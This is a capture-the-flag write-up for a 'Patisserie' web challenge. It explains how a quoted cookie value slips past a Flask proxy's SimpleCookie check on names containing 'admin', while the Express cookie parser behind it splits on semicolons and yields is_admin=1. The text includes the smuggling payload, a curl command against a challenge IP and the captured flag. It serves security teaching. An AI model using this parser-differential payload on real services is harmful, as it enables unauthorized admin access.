 Credit: 
 
 <img width="200" height="400" alt="image" src="https://github.com/user-attachments/assets/53d3cbf9-11d0-4d98-99f6-63d2440daeba" />

 First step is finding where we need to go to get the flag. Looking through the files we find this 

`app/index.js`

```javascript
app.get("/admin", (req, res) => {
  if (req.cookies.is_admin === "1") {
    return res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin - Patisserie</title>${PAGE_STYLE}</head>
<body>
${nav("Admin")}
<div class="container">
  <h1>Admin Panel</h1>
  <div class="card">
    <h2>Secret Recipe</h2>
    <p>${FLAG}</p>
  </div>
</div>
</body></html>`);
  }
...
```

so the goal is quite clear we just need to have a cookie with the property `is_admin=1`

We first start by seeing how data is moving through the server by looking at `compose.yml` which is a configuration files for docker compose.

Docker is basically a containerisation tool to help you run you code anywhere by packaging all the things you need to run your software into a single package which you can then run using docker.

`compose.yml`
```yml
services:
  proxy:
    build: ./proxy
    ports:
      - "${PORT:-3000}:8080"
    environment:
      - BACKEND_URL=http://app:3000
    depends_on:
      - app
  app:
    build: ./app
    environment:
      - FLAG=tkbctf{dummy}
      - COOKIE_SECRET=<REDACTED>
      - ADMIN_PASSWORD=<REDACTED>
```

From this we can see that your traffic is first routed to the proxy service with PORT environment variable or if it is not given it will be routed from port `3000` to port `8080`. Note that this port is the external port and not the internal port used by docker. After being routed into port `8080` in docker the traffic is then routed to app service port `3000` inside docker.

So now we have an idea of how the data flows. Client -> Proxy Service -> App Service.

We first start by looking into proxy service and try to see how cookies are handled since the goal is to have `is_admin=1` cookie to get the flag through the `/admin` route so we see how it is handled.

Inside the flask application we find this route which will help serve the `/admin` path. The thing to focus on here is the `check_cookies` function.

`app.py`
```python
@app.route("/<path:path>", methods=["GET", "POST", "PUT", "DELETE"])
def gateway(path):
    violation = check_cookies(request.headers.get("Cookie", ""))
    if violation:
        return Response("Access denied.\n", status=403, content_type="text/plain")

    parsed = urllib.parse.urlparse(BACKEND_URL)
    target_path = f"/{path}"
    qs = request.query_string.decode()
    if qs:
        target_path += f"?{qs}"

    conn = http.client.HTTPConnection(parsed.hostname, parsed.port or 80)
    fwd_headers = {}
    for key, value in request.headers:
        if key.lower() in ("host", "transfer-encoding"):
            continue
        fwd_headers[key] = value

    conn.request(request.method, target_path, body=request.get_data() or None, headers=fwd_headers)
    resp = conn.getresponse()

    resp_body = resp.read()
    resp_status = resp.status

    hop_by_hop = {
        "transfer-encoding", "content-length", "connection",
        "keep-alive", "upgrade", "proxy-authenticate",
        "proxy-authorization", "te", "trailers",
    }
    headers = []
    for key, value in resp.getheaders():
        if key.lower() not in hop_by_hop:
            headers.append((key, value))

    conn.close()
    return Response(resp_body, status=resp_status, headers=headers)
```

Looking into the `check_cookies` function we find the following.

```python
def check_cookies(cookie_header: str) -> str | None:
    cookie_header = cookie_header.strip()
    if not cookie_header:
        return None

    cookies = parse_cookie_header(cookie_header)
    if not cookies:
        return "malformed cookie"

    if len(cookies) > MAX_COOKIES:
        return "too many cookies"

    for name in cookies:
        if "admin" in name.lower():
            return "blocked cookie"

    return None
```

If you look at the last few lines you can see that it explicity checks if the cookies name contain admin. So the cookie `is_admin` which we need to set will not be accepted by the flask application. So what do we do next?
Well, we can look further into how cookies are actually processed. 

Typically when you send a request with multiple cookies if you look at the devtools you will see something like this where the cookies are separated by semi colons.
```
Cookie: a=123;b=456;c=789
```

But lets see how it is processed by this flask application.
We see it first goes into `parse_cookie_header`

```python
def parse_cookie_header(raw: str) -> dict[str, str]:
    sc = SimpleCookie()
    try:
        sc.load(raw)
    except Exception:
        return {}
    return {key: morsel.value for key, morsel in sc.items()}
```

It gets processed by a SimpleCookie object with the load method. Looking deeper into the load method we find

```python
def load(self, rawdata):
        """Load cookies from a string (presumably HTTP_COOKIE) or
        from a dictionary.  Loading cookies from a dictionary 'd'
        is equivalent to calling:
            map(Cookie.__setitem__, d.keys(), d.values())
        """
        if isinstance(rawdata, str):
            self.__parse_string(rawdata)
        else:
            # self.update() wouldn't call our custom __setitem__
            for key, value in rawdata.items():
                self[key] = value
        return
```

deeper still we get to the `__parse_string` private method where we can see how the cookie string is processed. Since regex is a black magic I just ask AI what it is trying to match to get the key value pairs of the cookies.
```python
_CookiePattern = re.compile(r"""
    \s*                            # Optional whitespace at start of cookie
    (?P<key>                       # Start of group 'key'
    [""" + _LegalKeyChars + r"""]+?   # Any word of at least one letter
    )                              # End of group 'key'
    (                              # Optional group: there may not be a value.
    \s*=\s*                          # Equal Sign
    (?P<val>                         # Start of group 'val'
    "(?:[^\\"]|\\.)*"                  # Any double-quoted string
    |                                  # or
    # Special case for "expires" attr
    (\w{3,6}day|\w{3}),\s              # Day of the week or abbreviated day
    [\w\d\s-]{9,11}\s[\d:]{8}\sGMT     # Date and time in specific format
    |                                  # or
    [""" + _LegalValueChars + r"""]*      # Any word or empty string
    )                                # End of group 'val'
    )?                             # End of optional value group
    \s*                            # Any number of spaces.
    (\s+|;|$)                      # Ending either at space, semicolon, or EOS.
    """, re.ASCII | re.VERBOSE)    # re.ASCII may be removed if safe.

...
def __parse_string(self, str, patt=_CookiePattern):
        i = 0                 # Our starting point
        n = len(str)          # Length of string
        parsed_items = []     # Parsed (type, key, value) triples
        morsel_seen = False   # A key=value pair was previously encountered

        TYPE_ATTRIBUTE = 1
        TYPE_KEYVALUE = 2

        # We first parse the whole cookie string and reject it if it's
        # syntactically invalid (this helps avoid some classes of injection
        # attacks).
        while 0 <= i < n:
            # Start looking for a cookie
            match = patt.match(str, i)
            if not match:
                # No more cookies
                break

            key, value = match.group("key"), match.group("val")
            i = match.end(0)

            if key[0] == "$":
                if not morsel_seen:
                    # We ignore attributes which pertain to the cookie
                    # mechanism as a whole, such as "$Version".
                    # See RFC 2965. (Does anyone care?)
                    continue
                parsed_items.append((TYPE_ATTRIBUTE, key[1:], value))
            elif key.lower() in Morsel._reserved:
                if not morsel_seen:
                    # Invalid cookie string
                    return
                if value is None:
                    if key.lower() in Morsel._flags:
                        parsed_items.append((TYPE_ATTRIBUTE, key, True))
                    else:
                        # Invalid cookie string
                        return
                else:
                    parsed_items.append((TYPE_ATTRIBUTE, key, _unquote(value)))
            elif value is not None:
                parsed_items.append((TYPE_KEYVALUE, key, self.value_decode(value)))
                morsel_seen = True
            else:
                # Invalid cookie string
                return

        # The cookie string is valid, apply it.
        M = None         # current morsel
        for tp, key, value in parsed_items:
            if tp == TYPE_ATTRIBUTE:
                assert M is not None
                M[key] = value
            else:
                assert tp == TYPE_KEYVALUE
                rval, cval = value
                self.__set(key, rval, cval)
                M = self[key]
```

One thing from the AI that stood out to me was this
```md
Double-Quoted Strings: "(?:[^\\"]|\\.)*"

- Matches a string starting and ending with double quotes.

- [^\\"] matches any character that is not a backslash or a quote.

- \\. matches an escaped character (a backslash followed by any character).

- This allows the value to contain literal quotes if they are escaped.
```

I thought if it would be possible for the cookie `is_admin` to be stored in values instead of key since previously we have already seen cookie name cannot contain admin. So working off this I tried this the payload is as follows.

`test="1;is_admin=1;"`

the idea is to get a key value pair of

`test = "1;is_admin=1;"`

so the is admin cookie will not be detected by this part of the check_cookies function

```python
for name in cookies:
    if "admin" in name.lower():
        return "blocked cookie"
```

Now our cookie will be passed into the express server as such

`test="1;is_admin=1;"`

Express uses this concept of middlewares where each requests goes through these middlewares. In the `index.js` file we find this

```javascript
const app = express();
app.use(cookieParser(COOKIE_SECRET));
app.use(express.urlencoded({ extended: false }));
```

going into the github repo of cookie-parser we find this 

```javascript
function cookieParser (req, res, next) {
    if (req.cookies) {
      return next()
    }

    var cookies = req.headers.cookie

    req.secret = secrets[0]
    req.cookies = Object.create(null)
    req.signedCookies = Object.create(null)

    // no cookies
    if (!cookies) {
      return next()
    }

    req.cookies = cookie.parse(cookies, options)
...
```

going deeper into the cookie package to find `cookie.parse` we can find a difference in the way cookies are parsed. It seems like now in the express backend, the cookies are parsed based on `;` semicolons instead of including double quoted strings.
```javascript
...
export function parseCookie(str: string, options?: ParseOptions): Cookies {
  const obj: Cookies = new NullObject();
  const len = str.length;
  // RFC 6265 sec 4.1.1, RFC 2616 2.2 defines a cookie name consists of one char minimum, plus '='.
  if (len < 2) return obj;

  const dec = options?.decode || decode;
  let index = 0;

  do {
    const eqIdx = eqIndex(str, index, len);
    if (eqIdx === -1) break; // No more cookie pairs.

    const endIdx = endIndex(str, index, len);

    if (eqIdx > endIdx) {
      // backtrack on prior semicolon
      index = str.lastIndexOf(";", eqIdx - 1) + 1;
      continue;
    }

    const key = valueSlice(str, index, eqIdx);

    // only assign once
    if (obj[key] === undefined) {
      obj[key] = dec(valueSlice(str, eqIdx + 1, endIdx));
    }

    index = endIdx + 1;
  } while (index < len);

  return obj;
}
...
export { stringifySetCookie as serialize, parseCookie as parse };
```

So our original cookie

`test="1;is_admin=1;"`

now turns into this json object

```json
{
  "test" : "\"1",
  "is_admin" : "1"
}
```

So since we now have the correct cookie we can go back to the admin endpoint to view the `/admin` route

```javascript
app.get("/admin", (req, res) => {
  if (req.cookies.is_admin === "1") {
    return res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin - Patisserie</title>${PAGE_STYLE}</head>
...
```

Using a simple curl command with the cookie we built we can find the flag `tkbctf{qu0t3d_c00k13_smuggl1ng_p4rs3r_d1ff_7d3f8a2b}`
```bash
curl -H 'Cookie: test="1;is_admin=1;"' http://35.194.108.145:29214/admin | grep tkbctf{
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3548  100  3548    0     0  19982      0 --:--:-- --:--:-- --:--:-- 20045
    <p>tkbctf{qu0t3d_c00k13_smuggl1ng_p4rs3r_d1ff_7d3f8a2b}</p>
```

The lesson here is that if you are planning to use different parsers ensure they have basically identical implementations and don't parse the same thing string differently.



